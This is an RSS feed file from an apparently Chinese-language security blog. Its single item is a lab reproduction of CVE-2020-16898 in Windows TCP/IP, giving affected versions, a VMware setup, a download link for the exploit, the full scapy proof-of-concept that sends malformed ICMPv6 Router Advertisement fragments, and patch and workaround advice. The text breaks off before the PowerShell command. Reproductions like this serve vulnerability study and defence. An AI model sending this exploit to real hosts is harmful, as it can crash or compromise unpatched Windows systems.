@@ -1,0 +1,474 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>CVE on Luna_Blog</title>
+        <link>https://lunaasuka.github.io/tags/cve/</link>
+        <description>Recent content in CVE on Luna_Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <lastBuildDate>Wed, 03 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://lunaasuka.github.io/tags/cve/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>CVE-2020-16898漏洞复现</title>
+        <link>https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h3 id=&#34;内含exp&#34;&gt;内含EXP&lt;/h3&gt;
+&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述&lt;/h2&gt;
+&lt;p&gt;​		远程攻击者通过构造特制的ICMPv6  Router  Advertisement（路由通告）数据包，并将其发送到远程Windows主机上，即可在目标主机上执行任意代码。要利用此漏洞，攻击者必须将特制的ICMPv6路由器广告数据包发送到远程Windows计算机。&lt;/p&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server 2019&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server 2019 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 1903 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 1909 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 2004 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;攻击机：kali2019&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​		python版本3.7.4，已安装scapy包。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;靶机：win10 2004版本&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;首先我们要在虚拟机中nat一个子网出来，打开VMware，选择左上角编辑→虚拟网络编辑器，打开后点击下方的“更改设置”。&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562.png&#34;
+	width=&#34;1278&#34;
+	height=&#34;654&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562_hu81f59daf043eaf67d146aca1115a7884_68018_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562_hu81f59daf043eaf67d146aca1115a7884_68018_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758181562&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;468px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后进入NAT设置中选择启用IPV6，应用设置即可。&lt;/p&gt;
+&lt;p&gt;这边开启之后去把win10的ipv6打开，进入网络和internet设置，查看虚拟网卡的属性。&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441.png&#34;
+	width=&#34;782&#34;
+	height=&#34;585&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441_hu19df3a1e78db4bea68fb410623c9e2ce_54245_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441_hu19df3a1e78db4bea68fb410623c9e2ce_54245_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758404441&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;勾选IPV6即可。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557.png&#34;
+	width=&#34;819&#34;
+	height=&#34;491&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557_hue99ccb8d48c27e06d0b510821ed143fe_12695_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557_hue99ccb8d48c27e06d0b510821ed143fe_12695_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758518557&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;400px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
+&lt;p&gt;EXP下载地址： &lt;a class=&#34;link&#34; href=&#34;http://site.pi3.com.pl/exp/p_CVE-2020-16898.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://site.pi3.com.pl/exp/p_CVE-2020-16898.py&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Author: Adam &amp;#39;pi3&amp;#39; Zabrocki&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# http://pi3.com.pl&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;v6_dst&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fd12:db80:b052:0:7ca6:e06e:acc1:481b&amp;#34;&lt;/span&gt; 		&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;这里替换成靶机的&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址或临时ipv6地址&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;v6_src&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fe80::24f5:a2ff:fe30:8890&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;这里替换成攻击机的本地链接&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;或者最短的那个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\x30&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xFF\x18&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;p_test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptEFA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptRDNSS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6ND_RA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptRDNSS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+      &lt;span class=&#34;n&#34;&gt;Raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\xa0&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;p_test_frag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IPv6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6_dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6_src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hlim&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+              &lt;span class=&#34;n&#34;&gt;IPv6ExtHdrFragment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fragment6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p_test_frag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;配置好后执行exp即可。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 CVE-2020-16898.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287.png&#34;
+	width=&#34;1194&#34;
+	height=&#34;920&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287_hu4bcd3bd88d4ad3c22014a44bd68492e2_57381_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287_hu4bcd3bd88d4ad3c22014a44bd68492e2_57381_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758979287&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;129&#34;
+		data-flex-basis=&#34;311px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;修复方式&#34;&gt;修复方式&lt;/h2&gt;
+&lt;p&gt;1.升级windows版本，下载对应补丁包进行修复。&lt;/p&gt;
+&lt;p&gt;​		下载链接：&lt;a class=&#34;link&#34; href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2.禁用基于RA的DNS配置CMPv6 RDNSS&lt;/p&gt;
+&lt;p&gt;​		使用以下PowerShell命令禁用ICMPv6 RDNSS，以防止攻击者利用此漏洞。此解决方法仅适用于Windows 1709及更高版本。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
